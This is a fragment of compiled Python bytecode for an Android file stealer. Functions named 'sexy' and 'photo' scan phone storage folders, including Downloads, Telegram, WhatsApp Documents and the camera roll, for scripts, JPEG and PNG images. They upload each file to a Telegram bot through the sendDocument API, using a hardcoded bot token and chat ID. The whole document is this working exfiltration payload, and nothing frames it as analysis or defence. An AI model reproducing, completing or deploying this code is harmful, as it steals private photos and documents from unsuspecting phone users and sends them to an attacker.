0\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0f}\x03d\x10\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x11}\x03d\x12\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bd\x00S\x00#\x00\x01\x00Y\x00d\x00S\x00x\x03Y\x00w\x01)\x13N\xfa.6602564808:AAEkhZwDSKdFMQ8W9TjpgM_VxFzqzYN9jHk\xda\n6957719257z\x07/sdcardc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00\xa9\x01z\x03.py\xa9\x01\xda\x08endswith\xa9\x02\xda\x02.0\xda\x01fs\x02\x00\x00\x00  r\x07\x00\x00\x00\xfa\n<listcomp>z\x18sexy.<locals>.<listcomp>\x17\x00\x00\x00\xf3)\x00\x00\x00\x80\x00\xd0\x14M\xd0\x14M\xd0\x14M\x981\xb81\xbf:\xba:\xc0e\xd1;L\xd4;L\xd0\x14M\x90Q\xd0\x14M\xd0\x14M\xd0\x14Mr\t\x00\x00\x00\xda\x02rb\xfa\x1chttps://api.telegram.org/bot\xfa\r/sendDocument\xda\x07chat_id\xda\x08document\xa9\x02\xda\x04data\xda\x05filesz\x10/sdcard/Downloadc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>$\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00z\x19/sdcard/Download/Telegramc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>1\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00z\x1f/sdcard/Telegram/Telegram Filesc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>>\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00z)/sdcard/WhatsApp/Media/WhatsApp Documentsc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>K\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00)\x08r\x05\x00\x00\x00r\x06\x00\x00\x00\xda\x02os\xda\x07listdir\xda\x04open\xda\x04path\xda\x04join\xda\x04post\xa9\rr\x06\x00\x00\x00\xda\tbot_tokenr\x19\x00\x00\x00\xda\x0bsdcard_path\xda\tfile_list\xda\x04filer\x13\x00\x00\x00\xda\x03url\xda\x05data2r\x1c\x00\x00\x00r\x1d\x00\x00\x00\xda\x03get\xda\x04sents\r\x00\x00\x00             r\x07\x00\x00\x00\xda\x04sexyr1\x00\x00\x00\x0f\x00\x00\x00s\xef\x05\x00\x00\x80\x00\xdd\x0c\x14\xd4\x0c\x1c\xd1\x0c\x1e\xd4\x0c\x1e\x80G\xd8\x0f?\x80I\xd8\r\x19\x80G\xf0\x04\x0c\x05\x10\xe0\x16\x1f\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x16(\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x161\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x167\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x16A\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf0\x00\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\x884\xf8\xf8\xf8s\xf9\x00\x00\x00\x99A\x12C\x07\x00\xc1+A\x03B:\x05\xc2.\x0cC\x07\x00\xc2:\x04B>\t\xc2>\x03C\x07\x00\xc3\x01\x01B>\t\xc3\x02\x04C\x07\x00\xc3\x07\x02C\x0b\x03\xc3\x0fA\x12E=\x00\xc4!A\x03E0\x05\xc5$\x0cE=\x00\xc50\x04E4\t\xc54\x03E=\x00\xc57\x01E4\t\xc58\x04E=\x00\xc5=\x02F\x01\x03\xc6\x05A\x12H3\x00\xc7\x17A\x03H&\x05\xc8\x1a\x0cH3\x00\xc8&\x04H*\t\xc8*\x03H3\x00\xc8-\x01H*\t\xc8.\x04H3\x00\xc83\x02H7\x03\xc8;A\x12K)\x00\xca\rA\x03K\x1c\x05\xcb\x10\x0cK)\x00\xcb\x1c\x04K \t\xcb \x03K)\x00\xcb#\x01K \t\xcb$\x04K)\x00\xcb)\x02K-\x03\xcb1A\x12N \x00\xcd\x03A\x03N\x12\x05\xce\x06\x0cN \x00\xce\x12\x04N\x16\t\xce\x16\x03N \x00\xce\x19\x01N\x16\t\xce\x1a\x04N \x00\xce \x02N%\x03c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3*\x06\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x01}\x01d\x02}\x02\t\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03d\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x06}\x03d\x07\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x06}\x03d\x0e\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0f}\x03d\x10\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0f}\x03d\x11\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bd\x00S\x00#\x00\x01\x00Y\x00d\x00S\x00x\x03Y\x00w\x01)\x12Nr\x0b\x00\x00\x00r\x0c\x00\x00\x00z\x08.pho.txt\xda\x01a\xda\x04donez\x13/sdcard/DCIM/Camerac\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00\xa9\x01z\x04.jpgr\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x19photo.<locals>.<listcomp>_\x00\x00\x00\xf3)\x00\x00\x00\x80\x00\xd0\x14N\xd0\x14N\xd0\x14N\x981\xb81\xbf:\xba:\xc0f\xd1;M\xd4;M\xd0\x14N\x90Q\xd0\x14N\xd0\x14N\xd0\x14Nr\t\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00r\x19\x00\x00\x00r\x1a\x00\x00\x00r\x1b\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00\xa9\x01z\x04.pngr\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  